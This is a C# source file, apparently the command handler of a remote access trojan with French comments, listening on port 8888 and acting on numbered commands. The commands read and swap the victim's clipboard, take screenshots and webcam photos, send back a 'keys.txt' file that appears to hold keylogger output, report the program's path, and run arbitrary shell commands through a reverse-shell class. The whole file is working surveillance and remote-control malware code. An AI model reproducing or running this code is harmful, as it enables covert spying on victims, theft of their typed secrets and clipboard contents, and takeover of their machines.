using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Drawing.Imaging;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Diagnostics;

using System.Net;      
using System.Net.Sockets;   


public class Test_client
{
    public static void test_client()
    {
        //---create a TCPClient object at the IP and port no.---
        TcpClient client = new TcpClient("192.168.1.194", 8888);
        NetworkStream ns = client.GetStream(); 
        byte[] hello = new byte[100];   
        hello = Encoding.Default.GetBytes("Hi, I'm Connected");

        //---send first message (hello)---
        ns.Write(hello, 0, hello.Length);

        client.Close();      
    }

    public static void writeStream(NetworkStream ns, byte[] data, string type){
        // Convert data to base64 then bytes
        string base64String = Convert.ToBase64String(data);
        byte[] to_send_base64 = Encoding.ASCII.GetBytes(base64String);
        
        // Build first msg (type + length)
        string firstmsg_string = type + to_send_base64.Length;

        // Convert first message to bytes then base64 then bytes again
        byte[] firstmsg_byte = Encoding.UTF8.GetBytes(firstmsg_string);
        string base64Stringfirstmsg = Convert.ToBase64String(firstmsg_byte);
        byte[] firstmsg_byte2 = Encoding.UTF8.GetBytes(base64Stringfirstmsg);

        // Send first message
        ns.Write(firstmsg_byte2, 0, firstmsg_byte2.Length);

        byte[] ackBuffer = new byte[3];
        int receivedBytes = ns.Read(ackBuffer, 0, ackBuffer.Length);
        string ackMessage = Encoding.UTF8.GetString(ackBuffer, 0, receivedBytes);

        if (ackMessage == "ACK") {
            // Compute the number of Packets to send
            int nbPackets = (to_send_base64.Length / 1024) + 1;
            int bytes_restant = to_send_base64.Length;

            // Send all packet one by one
            for(int i=0; i<nbPackets; i++){
                int to_send_length = Math.Min(1024, bytes_restant);
                ns.Write(to_send_base64, i*1024, to_send_length);
                bytes_restant = bytes_restant - to_send_length;
            }
        }
    }

    public static byte[] readStream(NetworkStream ns, int nbPackets, TcpClient client){
        // Init variable to store one packet
        byte[] bytesToRead = new byte[client.ReceiveBufferSize];
        // Init variable to store all the data
        byte[] wholeMessage = new byte[nbPackets * 1024];
        int bytesRead;

        // Read all the packet one by one and concatenate them in "wholeMessage"
        for(int i=0; i<nbPackets; i++){
            bytesRead = ns.Read(bytesToRead, 0, client.ReceiveBufferSize);
            System.Buffer.BlockCopy(bytesToRead, 0, wholeMessage, i*1024, bytesRead);
        }

        // Convert to string
        string Message_string = Convert.ToBase64String(wholeMessage);

        // Decode base64
        byte[] decodedMessage = Convert.FromBase64String(Message_string);

        return decodedMessage;
    }

    public static Image ByteArrayToImage(byte[] data){
            MemoryStream ms = new MemoryStream(data);
            Image returnImage = Image.FromStream(ms);
            return returnImage;
    }

    public static void Test_server(){
        TcpListener server = new TcpListener(IPAddress.Any, 8888);
        server.Start();

        while (true) 
        {
            TcpClient client = server.AcceptTcpClient();
            NetworkStream ns = client.GetStream();

            String data = "";

            // recuperer message 1
            byte[] msg1_byte = readStream(ns, 1, client);
            data = System.Text.Encoding.ASCII.GetString(msg1_byte, 0, msg1_byte.Length);

            if(data != ""){
                char inst = data[0];
                String str_size = data.Remove(0,1);
                int size = Int32.Parse(str_size);
                byte[] msg_bytes =  new byte[client.ReceiveBufferSize];
                byte[] to_send;

                if (size != 0){
                    int nbPackets = (size / 1024) + 1;
                    msg_bytes = readStream(ns, nbPackets, client);
                }

                    
                switch (inst)
                {
                    case '1':
                        ControlClipboard cb = new ControlClipboard();
                        int verifClip = cb.verifyClipboard();

                        if (verifClip == 1){
                            String clip = cb.ReadClipboardText();
                            to_send = Encoding.Default.GetBytes(clip);
                            writeStream(ns, to_send, "1");
                        }

                        else if (verifClip == 2){
                            Image img_clip = cb.ReadClipboardImage();
                            ImageConverter converter1 = new ImageConverter();
                            to_send = (byte[])converter1.ConvertTo(img_clip, typeof(byte[]));
                            writeStream(ns, to_send, "2");
                        }
                        else {
                            to_send = Encoding.Default.GetBytes("Le presse-papier de la cible est vide.");
                            writeStream(ns, to_send, "1");
                        }
                        break;

                    case '2':
                        String replacementText = System.Text.Encoding.ASCII.GetString(msg_bytes, 0, msg_bytes.Length);
                        ControlClipboard cb2 = new ControlClipboard();
                        cb2.SwapClipboardText(replacementText);

                        to_send = Encoding.Default.GetBytes("succès");
                        //writeStream(ns, to_send, "1");
                        break;

                    case '3':
                        Image replacementImage = ByteArrayToImage(msg_bytes);
                        ControlClipboard cb3 = new ControlClipboard();
                        cb3.SwapClipboardImage(replacementImage);

                        to_send = Encoding.Default.GetBytes("succès");
                        //writeStream(ns, to_send, "2");
                        break;
                        
                    case '4':
                        ScreenManagement sc = new ScreenManagement();
                        Bitmap screen = sc.Screenshot();

                        // Convert the screenshot to a byte array
                        ImageConverter converter = new ImageConverter();
                        to_send = (byte[])converter.ConvertTo(screen, typeof(byte[]));
                        writeStream(ns, to_send, "2");
                        break;
                    
                    case '5':
                        FileManagement wr = new FileManagement();  
                        String txt = wr.ReadData("keys.txt");
                        to_send = Encoding.Default.GetBytes(txt);
                        writeStream(ns, to_send, "1");
                    break;

                    case '6':
                        WebcamHandler wh = new WebcamHandler();
                        Bitmap webcam_photo = wh.getPhoto();

                        ImageConverter converter2 = new ImageConverter();
                        to_send = (byte[])converter2.ConvertTo(webcam_photo, typeof(byte[]));
                        writeStream(ns, to_send, "2");
                    break;

                    case '7':
                        string execPath = Assembly.GetEntryAssembly().Location;
                        to_send = Encoding.ASCII.GetBytes(execPath);
                        writeStream(ns, to_send, "1");
                    break;

                    case '8':
                        String command = System.Text.Encoding.ASCII.GetString(msg_bytes, 0, msg_bytes.Length);
                        ReverseShell rs = new ReverseShell();
                        string retour = rs.reverse_shell(command);
                        to_send = Encoding.ASCII.GetBytes(retour);
                        writeStream(ns, to_send, "1");

                    break;

                    default:
                        to_send = Encoding.Default.GetBytes("échec");
                        writeStream(ns, to_send, "1");
                        break;
                }
            }
        }
    }
}